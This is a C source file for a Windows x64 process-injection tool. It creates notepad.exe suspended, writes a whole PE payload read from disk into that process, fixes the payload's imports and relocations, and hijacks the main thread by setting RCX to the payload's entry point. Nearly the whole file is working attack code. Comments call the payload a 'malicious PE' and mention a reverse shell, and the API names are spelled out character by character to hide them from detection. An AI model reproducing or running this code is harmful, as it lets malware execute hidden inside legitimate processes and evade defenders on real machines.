/*
*
* NOTE: PLEASE COMPILE AS RELEASE.
*
* Inject whole PE into remote process (64bit), not quite process hollowing
* because hollowed process without backup image path is somewhat too
* suspicious.
*
* While debugging a normal suspended process, one can find that RCX points
* to process entry point, and RDX points to PEB. RCX is the focus.
*
* The whole PE is injected, and host process ImageBaseAddress is updated
* then, injected PE ImageBase is updated, IAT and relocation are fixed, RCX is patched
* with new entry point for the injected PE, after resuming the thread, host
* process is going to execute the entry point in injected PE
*
* Steps:
* 1. Create SUSPENDED remote process;
* 2. Read PEB from remote process, get SizeOfImage;
* 3. Allocate memory in remote process;
* 4. Update ImageBase in optional header for injected PE;
* 5. Fix IAT in local PE;
* 6. Fix relocations in local PE;
* 7. Write malicious PE into allocated memory;
* 8. Hijack init thread, update RCX to point to new entry point;
* 9. Resume thread;
*
*/

#include <windows.h>
#include <stdio.h>
#include "Structs.h"

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define SET_LAST_NT_ERROR(s) SetLastError(s)
#define RVA2VA(Type,ImgBase,Rva) (Type)((ULONG_PTR)ImgBase + Rva)
#define PTR(x) (ULONG_PTR)(x)
#define DEREF(x) *(ULONG_PTR*)x
#define DEREF32(x) *(DWORD*)(x)

#define GetRelocNmbrOfEntries(dwBlockSize)			\
      (dwBlockSize -								\
      sizeof(IMAGE_BASE_RELOCATION)) /				\
      sizeof(RELOCATION_ENTRY)

#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((ULONG_PTR)(ntheader) +                                            \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DLOG(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DLOG(x, ...)
#define _INT
#endif

//
// Get offset to raw data for a specific RVA (entry point or relocation page)
// For entry point, if the image if copied as a whole, the entry poiont should
// be: EntryPoint = ImageBase + AddressOfEntryPoint - SectionVirtualAddress + SectionPointerToRawData;
// if the image is copied part by part, meaning headers first, then sections, then entry
// point is just EntryPoint = ImageBase + AddressOfEntryPoint
// 
// The raw data offset for relocation page is the same, we find which section the page RVA
// resides in, then calculate using the formula: 
// RelocationPageVA = ImageBase + RelocationPageRVA - SectionVirtualAddress + SectionPointerToRawData;
//
VOID GetOffsetToRawData(_In_ PIMAGE_NT_HEADERS pPeImgNtHdrs, _In_ DWORD dwRva, _Out_ PDWORD dwPeSectionVirtualAddr, _Out_ PDWORD dwPePointerToRawData)
{
	PIMAGE_SECTION_HEADER pPeImgSecHdr = RVA2VA(PIMAGE_SECTION_HEADER, &pPeImgNtHdrs->OptionalHeader, pPeImgNtHdrs->FileHeader.SizeOfOptionalHeader);
	for (USHORT i = 0; i < pPeImgNtHdrs->FileHeader.NumberOfSections; i++)
	{
		//
		// find in which section does the RVA reside
		// we use this to resolve raw offset for entry point or relocation page
		//
		*dwPeSectionVirtualAddr = pPeImgSecHdr->VirtualAddress;
		// ?? pPeImgSecHdr->Misc.VirtualSize
		if (dwRva >= *dwPeSectionVirtualAddr && dwRva < *dwPeSectionVirtualAddr + pPeImgSecHdr->SizeOfRawData)
		{
			// Get the PointerToRawData of target section
			*dwPePointerToRawData = pPeImgSecHdr->PointerToRawData;

			DLOG("\t\t\\___[*]PointerToRawData of %s section: 0x%X\n", (CHAR*)pPeImgSecHdr->Name, pPeImgSecHdr->PointerToRawData);
			DLOG("\t\t\\___[*]VirtualAddress of %s section: 0x%X\n", (CHAR*)pPeImgSecHdr->Name, pPeImgSecHdr->VirtualAddress);
			break;
		}
		pPeImgSecHdr++;
	}
}

int main()
{
	WCHAR szNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l',  'l', 0x0 };
	unsigned char ucNtQueryInformationProcess[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's',  's', 0x0 };
	unsigned char ucNtUnmapViewOfSection[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o',  'n', 0x0 };
	unsigned char ucNtAllocateVirtualMemory[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r',  'y', 0x0 };
	unsigned char ucNtWriteVirtualMemory[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r',  'y', 0x0 };

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0x0 };
	PROCESS_BASIC_INFORMATION pbi = { 0x0 };
	FARPROC NtQueryInformationProcess = NULL;
	FARPROC NtUnmapViewOfSection = NULL;
	FARPROC NtAllocateVirtualMemory = NULL;
	FARPROC NtWriteVirtualMemory = NULL;
	ULONG uRetern = 0x0;
	NTSTATUS status = 0x0;
	PVOID pRemoteImgBaseAddr = NULL;
	PPEB pPeb = NULL;
	PVOID pNewRemoteImgBaseAddr = NULL;
	SIZE_T sPayload = 0x0;
	SIZE_T sBytesToAllocate = 0x0;
	SIZE_T sBytesWritten = 0x0;
	PBYTE pPlainText = NULL;
	ULONG_PTR dwImgBaseDelta = 0x0;
	DWORD dwPlainSize = NULL;
	DWORD dwRemoteImgSize = 0x0;
	DWORD dwOldProtect = 0x0;

	//
	// Read svchost.exe to be injected into remote process
	//

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>> Read PE From Disk <<<<<<<<<<<<<<<<<<<<<<<<<<<] \n\n");
	DLOG("[*]Press <Enter> to read PE from disk ...");
	_INT;

	HANDLE hCMD = CreateFile(L"c:\\windows\\tasks\\putty.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD dwFileSize = GetFileSize(hCMD, NULL);
	PVOID payload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	DWORD dwBytesRead = 0x0;
	ReadFile(hCMD, payload, dwFileSize, &dwBytesRead, NULL);

	DLOG("[*]Bytes read: %ld\n", dwBytesRead);
	DLOG("[*]Buffer for local PE @ >>>>>>>>> 0x%p\n", payload);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>> Create Host Process <<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");
	DLOG("[*]Press <Enter> to create host process ...");
	_INT;

	NtQueryInformationProcess = GetProcAddress(GetModuleHandle(szNtdll), ucNtQueryInformationProcess);
	if (NULL == NtQueryInformationProcess)
	{
		DLOG("[-]Failed to resolve NtQueryInformationProcess ... \n");
		goto _exit;
	}

	//
	// create suspended thread
	//
	CreateProcess(
		L"C:\\Windows\\System32\\notepad.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		L"c:\\windows\\system32\\",
		&si, &pi);

	DLOG("[*]Process created with PID: %d\n", pi.dwProcessId);
	DLOG("[*]Process handle: 0x%.8x\n", pi.hProcess);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>> Read Host Process Info <<<<<<<<<<<<<<<<<<<<<<<<]\n\n");
	DLOG("[*]Press <Enter> to read host process info ... ");
	_INT;

	//
	// read process info, get PEB address
	//
	if (!NT_SUCCESS(status = NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&uRetern)))
	{
		SET_LAST_NT_ERROR(status);
		DLOG("[-]Failed to query process information ... 0x%.8X\n", GetLastError());
		goto _exit;
	}

	pPeb = pbi.PebBaseAddress;
	if (NULL == pPeb)
	{
		DLOG("[-]Failed to get PEB ...\n");
		goto _exit;
	}

	DLOG("[*]Remote host process PEB base address @ >>>>>>>>> 0x%p\n", pPeb);
	DLOG("[*]Remote host process address of PEB.ImageBaseAddress member @ >>>>>>>>> 0x%p\n", &pPeb->ImageBaseAddress);

	//
	// get ImageBaseAddress in memory for host process
	//
	if (!ReadProcessMemory(pi.hProcess, &pPeb->ImageBaseAddress, &pRemoteImgBaseAddr, sizeof(PVOID), NULL))
	{
		DLOG("[-]Failed to read process memroy with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	DLOG("[*]Remote host process image base address @ >>>>>>>> 0x%p\n", pRemoteImgBaseAddr);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>> Read Local PE Info <<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");
	DLOG("[*]Press <Enter> to read local process info ... ");
	_INT;

	//
	// read inject PE header data, this is to get ImageSize for memory allocation
	// and to update ImageBase in optional header with newly allocated memory addr
	//
	PIMAGE_DOS_HEADER pPeImgDosHdr = (PIMAGE_DOS_HEADER)payload;
	if (IMAGE_DOS_SIGNATURE != pPeImgDosHdr->e_magic)
	{
		DLOG("[-]Failed to resolve source PE dos header ...\n");
		goto _exit;
	}

	PIMAGE_NT_HEADERS pPeImgNtHdrs = RVA2VA(PIMAGE_NT_HEADERS, pPeImgDosHdr, pPeImgDosHdr->e_lfanew);
	if (IMAGE_NT_SIGNATURE != pPeImgNtHdrs->Signature)
	{
		DLOG("[-]Failed to resolve source PE nt headers ...\n");
		goto _exit;
	}

	NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(szNtdll), ucNtAllocateVirtualMemory);
	if (NULL == NtAllocateVirtualMemory)
	{
		DLOG("[-]Failed to resolve NtAllocateVirtualMemory ... \n");
		goto _exit;
	}

	sBytesToAllocate = pPeImgNtHdrs->OptionalHeader.SizeOfImage;
	sPayload = sizeof(payload);

	DLOG("[*]Local PE image size: %I64u bytes\n", sBytesToAllocate);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>> Allocate Memory in Host Process <<<<<<<<<<<<<<<<<<<<]\n\n");

	DLOG("[*]Press <Enter> to allocate memory for image ...");
	_INT;

	if (!NT_SUCCESS(status = NtAllocateVirtualMemory(pi.hProcess, &pNewRemoteImgBaseAddr, 0, &sBytesToAllocate, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
	{
		SET_LAST_NT_ERROR(status);
		DLOG("[-]Failed to allovate virtual memory with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	// delta between new image address and preferred ImageBase in injected PE OptionalHeader
	dwImgBaseDelta = PTR(pNewRemoteImgBaseAddr) - pPeImgNtHdrs->OptionalHeader.ImageBase;

	DLOG("[*]New remote image base address allocated @ >>>>>>>>> %p, bytes allocated: %I64u\n", pNewRemoteImgBaseAddr, sBytesToAllocate);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>> Patch Source PE Image Base <<<<<<<<<<<<<<<<<<<<<<]\n\n");
	DLOG("[*]Press <Enter> to patch PE image base ...");
	_INT;

	//
	// patch injected PE with new image base address
	//
	DWORD dwPeImgBaseOffset = pPeImgDosHdr->e_lfanew + 0x30;
	DLOG("[*]Patching source PE Image Base ...");

	*(UINT_PTR*)(PTR(payload) + dwPeImgBaseOffset) = pNewRemoteImgBaseAddr;

	DLOG(" [+]Done ...\n");

#ifdef _DBG
	//
	// verify patch
	//
	PIMAGE_DOS_HEADER pPePatchedImgDosHdr = (PIMAGE_DOS_HEADER)payload;
	if (IMAGE_DOS_SIGNATURE != pPePatchedImgDosHdr->e_magic)
	{
		DLOG("[-]Failed to resolve source PE dos header ...\n");
		goto _exit;
	}

	PIMAGE_NT_HEADERS pPePatchedImgNtHdrs = RVA2VA(PIMAGE_NT_HEADERS, pPePatchedImgDosHdr, pPePatchedImgDosHdr->e_lfanew);
	if (IMAGE_NT_SIGNATURE != pPePatchedImgNtHdrs->Signature)
	{
		DLOG("[-]Failed to resolve source PE nt headers ...\n");
		goto _exit;
	}

	DLOG("[*]New image base in PE's optional header is: 0x%p...\n", pPePatchedImgNtHdrs->OptionalHeader.ImageBase);
#endif

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Fix IAT <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");

	//
	// perfrom IAT fixing for the PE in memory (if any)
	//

	DLOG("[*]Press <Enter> to fix IAT ...");
	_INT;

	DLOG("[*]Start fixing IAT ...\n");

	IMAGE_DATA_DIRECTORY pPeImgImpDir = pPeImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	DLOG("\t\\___[*]Import directory RVA @ >>>>>>>>> 0x%X\n", pPeImgImpDir.VirtualAddress);
	DLOG("\t\\___[*]Import directory size: 0x%X\n", pPeImgImpDir.Size);

	// if we have any import data to process
	if (pPeImgImpDir.Size)
	{
		DWORD dwPeSectionVirtualAddr = 0x0;
		DWORD dwPeRawOffsetToImpDesp = 0x0;
		// get the raw offset of data for IMAGE_IMPORT_DESCRIPTOR struct
		// formula: ImageBase + (ExportDir.VirtualAddress - SectionVirtualAddress) + RawOffset
		// !!!NOTE: this formula applies to situation where the whole PE is read from disk by API
		// such as ReadFile(), if the PE is mapped using MapViewOfFile(), then simply adding
		// ImportDir.VirtualAddress to ImageBase is enough, this rule applies to other VA calculations
		// too like entry point which will be performed later
		GetOffsetToRawData(pPeImgNtHdrs, pPeImgImpDir.VirtualAddress, &dwPeSectionVirtualAddr, &dwPeRawOffsetToImpDesp);

		// get the first import descriptor struct in PE using the formula above
		PIMAGE_IMPORT_DESCRIPTOR pPeImgImpDesp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, payload, pPeImgImpDir.VirtualAddress - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp);

		DLOG("\t\\___[*]Image import descriptor @ >>>>>>>>> 0x%p\n", pPeImgImpDesp);

		DLOG("\t\\___[*]Name RVA in import 0x%X\n", pPeImgImpDesp->Name);

		// going through all imports
		while (pPeImgImpDesp->Name)
		{
			// load the library to get its base address, so we can add later to RVA of the target function
			// and patch the target PE
			ULONG_PTR upLibBase = (ULONG_PTR)LoadLibraryA((RVA2VA(LPCSTR, payload, pPeImgImpDesp->Name - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp)));
			DLOG("\n\t\\___[*]Loading library %s @ >>>>>>>>> 0x%p\n\n", (RVA2VA(LPCSTR, payload, pPeImgImpDesp->Name - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp)), upLibBase);

			// VA to OriginalFirstThunk, a pointer to a table of imported functions, use this to process import by ordinal
			ULONG_PTR upOriginalFirstThunk = RVA2VA(ULONG_PTR, payload, pPeImgImpDesp->OriginalFirstThunk - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp);

			DLOG("\t\t\\___[*]Original first thunk VA @ >>>>>>>>> 0x%p\n", upOriginalFirstThunk);
			DLOG("\t\t\\___[*]Original first thunk data at thunk address: 0x%X\n", DEREF(upOriginalFirstThunk));

			// VA to first thunk a pointer to a table of imported functions
			// this VA is the one pointed to the address of imported functions
			// to be called at runtime, not original first thunk
			ULONG_PTR upFirstThunk = RVA2VA(ULONG_PTR, payload, pPeImgImpDesp->FirstThunk - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp);

			DLOG("\t\t\\___[*]First thunk VA @ >>>>>>>>> 0x%p\n", upFirstThunk);
			DLOG("\t\t\\___[*]First thunk data at thunk address: 0x%X\n", DEREF(upFirstThunk));

			while (DEREF(upFirstThunk))
			{
				// This part is not thoroughly tested, haven't find a PE that relies on ordinals to import

				// check if we are dealing with ordinal imports, which means we must get function ordinal
				// subtract Base from export directory, this will get the index of the taget function into
				// the AddressOfFunctions array, then we can get the VA of the function
				if (upOriginalFirstThunk && ((PIMAGE_THUNK_DATA)upOriginalFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				{
					// get target library nt headers
					PIMAGE_NT_HEADERS upLibNtHdrs = RVA2VA(PIMAGE_NT_HEADERS, upLibBase, ((PIMAGE_DOS_HEADER)upLibBase)->e_lfanew);
					// get target library export table
					PIMAGE_EXPORT_DIRECTORY pLibExpDir = RVA2VA(PIMAGE_EXPORT_DIRECTORY, upLibBase, upLibNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
					// get target library AddressOfFunctions array
					ULONG_PTR pdwAddressOfFuncs = RVA2VA(ULONG_PTR, upLibBase, pLibExpDir->AddressOfFunctions);
					// get to the address of the target function, the index is: (FunctionOrdinal - ExportDir.Base) * sizeof(DWORD), each index is of type DWORD
					pdwAddressOfFuncs += (IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)upOriginalFirstThunk)->u1.Ordinal) - pLibExpDir->Base) * sizeof(DWORD);

					DLOG("\t\t\\___[*]Ordinal for function: %ld\n", ((PIMAGE_THUNK_DATA)upOriginalFirstThunk)->u1.Ordinal);
					DLOG("\t\t\\___[*]Base in export table: %ld\n", pLibExpDir->Base);

					// patch the address into FirstThunk
					DEREF(upFirstThunk) = upLibBase + DEREF32(pdwAddressOfFuncs);
					DLOG("\n\t\t\\___[*]Patched function address with ordinal %ld @ >>>>>>>>> 0x%p\n", IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)upOriginalFirstThunk)->u1.Ordinal) - pLibExpDir->Base, DEREF(upFirstThunk));
				}
				else
				{
					// we are dealing with imports by name here, much easier to use GetProcAddress()
					// haven't figured out the +2, but through debug you'll see you're 2 bytes short
					// to the first imported function name
					PIMAGE_IMPORT_BY_NAME pFuncImpByName = RVA2VA(PIMAGE_IMPORT_BY_NAME, payload, DEREF(upFirstThunk) - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp);
					DLOG("\t\t\\___[*]Function import by name structure offset @ >>>>>>>>> 0x%X\n", DEREF(upFirstThunk) - dwPeSectionVirtualAddr + dwPeRawOffsetToImpDesp);
					// patch the function address by calling GetProcAddress() and LoadLibraryA()
					DLOG("\n\t\t\\___[*]Going to patched function %s @ >>>>>>>> 0x%p", pFuncImpByName->Name, upFirstThunk);
					
					DEREF(upFirstThunk) = GetProcAddress((HMODULE)upLibBase, (LPCSTR)(pFuncImpByName->Name));

					DLOG("\n\t\t\\___[*]Patched function %s @ >>>>>>>> 0x%p with correct address @ >>>>>>>>> 0x%p\n", pFuncImpByName->Name, upFirstThunk, DEREF(upFirstThunk));
				}
				// Done with one function, move to the next
				upFirstThunk += sizeof(ULONG_PTR);
				// OriginalFirstThunk goes with FirstThunk too, if any
				if (upOriginalFirstThunk)
					upOriginalFirstThunk += sizeof(ULONG_PTR);
			}
			// move to next import descriptor struct, through debug
			// + sizeof(IMAGE_IMPORT_DESCRIPTOR) does not work, ++ will
			pPeImgImpDesp++;
		}
	}

	//
	// perform relocation for the PE in memory (if any)
	//

	// if we do have a difference between the two image bases
	if (dwImgBaseDelta)
	{
		DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Fix Relocation <<<<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");
		DLOG("[*]Press <Enter> to fix relocation ...");
		_INT;

		DLOG("[*]Start fixing Relocations ...\n");
		DLOG("[*]Image base delta: 0x%p\n", dwImgBaseDelta);

		IMAGE_DATA_DIRECTORY ImgRelocDir = pPeImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		DLOG("[*]Virtual address of reloc table: 0x%X\n", ImgRelocDir.VirtualAddress);
		DLOG("[*]size of reloc table: %X\n", ImgRelocDir.Size);

		// if we have any relocation data to process
		if (ImgRelocDir.Size)
		{
			DWORD dwPeSectionVirtualAddr = 0x0;
			DWORD dwPeRawOffsetToRelocPage = 0x0;

			// get first section in section headers
			PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pPeImgNtHdrs);
			// loop through all sections, find .reloc section
			for (int i = 0; i < pPeImgNtHdrs->FileHeader.NumberOfSections; i++)
			{
				// find .reloc section
				if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 0x6c65722e)
				{
					// this offset is used to calculate blocks
					DWORD dwOffset = 0x0;
					// this is the raw pointer to first relocation block
					DWORD dwRawPointerToRelocBlock = pSectionHeader[i].PointerToRawData;
					// if dwOffset is within relocation table size, we have more data to process
					while (dwOffset < ImgRelocDir.Size)
					{
						// get PIMAGE_BASE_RELOCATION struct
						PIMAGE_BASE_RELOCATION pCurrentBaseRelocBlock = RVA2VA(PIMAGE_BASE_RELOCATION, payload, dwRawPointerToRelocBlock + dwOffset);

						DLOG("\t\\___[*]Relocation block RVA @ >>>>>>>>> 0x%X\n", pCurrentBaseRelocBlock->VirtualAddress);
						DLOG("\t\\___[*]Relocation block size: 0x%X\n", pCurrentBaseRelocBlock->SizeOfBlock);

						// get the offset to raw data for relocation page
						GetOffsetToRawData(pPeImgNtHdrs, pCurrentBaseRelocBlock->VirtualAddress, &dwPeSectionVirtualAddr, &dwPeRawOffsetToRelocPage);

						// skip the first 8 bytes (that's IMAGE_BASE_RELOCATION struct) to get to RELOCATION_ENTRY data
						PRELOCATION_ENTRY pRelocEntry = RVA2VA(PRELOCATION_ENTRY, payload, dwRawPointerToRelocBlock + dwOffset + sizeof(IMAGE_BASE_RELOCATION));
						// dwOffset must skip first 8 bytes too in order to get to the next relocation block
						dwOffset += sizeof(IMAGE_BASE_RELOCATION);

						// calculate number of entries
						// formula: (PIMAGE_BASE_RELOCATION::SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_BASE_RELOCATION_ENTRY)
						// IMAGE_BASE_RELOCATION is 8 bytes, IMAGE_BASE_RELOCATION_ENTRY is 2 bytes
						DWORD dwNmbrOfEntries = GetRelocNmbrOfEntries(pCurrentBaseRelocBlock->SizeOfBlock);

						DLOG("\t\\___[*]Relocation entry VA @ >>>>>>>>> 0x%X\n", PTR(payload) + dwRawPointerToRelocBlock + dwOffset + sizeof(IMAGE_BASE_RELOCATION));
						DLOG("\t\\___[*]Number of entries in current page: %ld (decimal), 0x%X (hex)\n\n", dwNmbrOfEntries, dwNmbrOfEntries);

						// now loop through all entries and apply image base delta to fix relocation
						while (dwNmbrOfEntries--)
						{
							// add size of relocation entry, do this first thing because we
							// will have entry whose type is 0x0, which will be ignored but
							// offset should still be counted
							dwOffset += sizeof(RELOCATION_ENTRY);

							// hopefully we are only dealing with IMAGE_REL_BASED_DIR64 relocations
							if (0xA != pRelocEntry[dwNmbrOfEntries].Type)
								continue;

							// do the patch
							// find patch address
							// fist find VA to that page
							ULONG_PTR uRelocPage = RVA2VA(ULONG_PTR, payload, pCurrentBaseRelocBlock->VirtualAddress - dwPeSectionVirtualAddr + dwPeRawOffsetToRelocPage);
							// find exact address (+ pRelocEntry[dwNmbrOfEntries].Offset) where to apply the delta
							DEREF((uRelocPage + pRelocEntry[dwNmbrOfEntries].Offset)) += dwImgBaseDelta;
						}
					}
					break;
				}
			}
		}
	}

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>> Copy Image to Host Process <<<<<<<<<<<<<<<<<<<<<<]\n\n");

	DLOG("[*]Press <Enter> to copy image to new address ...");
	_INT;

	//
	// copy image to allocated memory address
	//
	NtWriteVirtualMemory = GetProcAddress(GetModuleHandle(szNtdll), ucNtWriteVirtualMemory);
	if (NULL == NtWriteVirtualMemory)
	{
		DLOG("[-]Failed to resolve NtWriteVirtualMemory ... \n");
		goto _exit;
	}

	// copy image part by part, headers then sections
	DLOG("[*]Copy headers ... \n");
	DLOG("[*]Header size: %ld ...", pPeImgNtHdrs->OptionalHeader.SizeOfHeaders);

	if (!NT_SUCCESS(status = NtWriteVirtualMemory(pi.hProcess, pNewRemoteImgBaseAddr, payload, pPeImgNtHdrs->OptionalHeader.SizeOfHeaders, &sBytesWritten)) || sBytesWritten != pPeImgNtHdrs->OptionalHeader.SizeOfHeaders)
	{
		SET_LAST_NT_ERROR(status);
		DLOG("[-]Failed to copy headers with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	DLOG(" [+]Done ...\n");
	DLOG("[*]Copy sections ... \n");

	PIMAGE_SECTION_HEADER pSecHdr = IMAGE_FIRST_SECTION(pPeImgNtHdrs);

	DLOG("[*]Number of sections: %ld ... ", pPeImgNtHdrs->FileHeader.NumberOfSections);

	for (int i = 0; i < pPeImgNtHdrs->FileHeader.NumberOfSections; i++)
	{
		PVOID dst = (PVOID)(PTR(pNewRemoteImgBaseAddr) + pSecHdr->VirtualAddress);
		PVOID src = (PVOID)(PTR(payload) + pSecHdr->PointerToRawData);
		if (!NT_SUCCESS(status = NtWriteVirtualMemory(pi.hProcess, dst, src, pSecHdr->SizeOfRawData, &sBytesWritten)) || sBytesWritten != pSecHdr->SizeOfRawData)
		{
			SET_LAST_NT_ERROR(status);
			DLOG("[-]Failed to copy sections with error: 0x%.8X\n", GetLastError());
			goto _exit;
		}
		pSecHdr++;
	}

	DLOG("[+]Done ... \n");

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>> Hijack Host Thread <<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");
	DLOG("[*]Press <Enter> to hijack thread ...");
	_INT;

	CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
	if (!GetThreadContext(pi.hThread, &ctx))
	{
		DLOG("[-]Failed to get thread context with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	//
	// calculate entry poiont
	//
	DWORD dwPeAddrOfEntryPoint = pPeImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
	PVOID pPeEntryPoint = (PVOID)(PTR(pNewRemoteImgBaseAddr) + dwPeAddrOfEntryPoint);

	//
	// in x64 processes, RCX is holding entry point
	//
	ctx.Rcx = (DWORD64)pPeEntryPoint;

	if (!SetThreadContext(pi.hThread, &ctx))
	{
		DLOG("[-]Failed to get thread context with error: 0x%.8X\n", GetLastError());
		goto _exit;
	}

	DLOG("[+]Done ...\n");

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Runtime info <<<<<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");

	DLOG("[*]Payload local image base @ >>>>>>>>> 0x%p\n", payload);
	DLOG("[*]Payload remote image base @ >>>>>>>>> 0x%p\n", pNewRemoteImgBaseAddr);
	DLOG("[*]Payload remote image entry point @ >>>>>>>>> 0x%p\n", pPeEntryPoint);

	DLOG("[*]Press <Enter> to resume thread ...");
	_INT;

	ResumeThread(pi.hThread);

	DLOG("\n[>>>>>>>>>>>>>>>>>>>>>>>>>>> Unmap Injected PE <<<<<<<<<<<<<<<<<<<<<<<<<<<]\n\n");

	//
	// unmap shellcode memory
	//
	NtUnmapViewOfSection = GetProcAddress(GetModuleHandle(szNtdll), ucNtUnmapViewOfSection);
	if (NULL == NtUnmapViewOfSection)
	{
		DLOG("[-]Failed to resolve NtUnmapViewOfSection ... \n");
		goto _exit;
	}

	NtUnmapViewOfSection(pi.hProcess, pNewRemoteImgBaseAddr);

	DLOG("[*]Shellcode unmapped ... [+]Done ... \n\n");

_exit:
	if (NULL != pi.hThread)
		WaitForSingleObject(pi.hThread, -1);

	//
	// wait for 50 millisecond, for reverse shell execution
	// then terminate target process
	// the newly created cmd.exe by reserse shell with no parent
	// will be another IoC, and cmd.exe will generate IO events
	// clearly in Process Hacker
	//
	if (NULL != pi.hProcess)
	{
		Sleep(50);
		TerminateProcess(pi.hProcess, 0);
	}

	return 0;
}

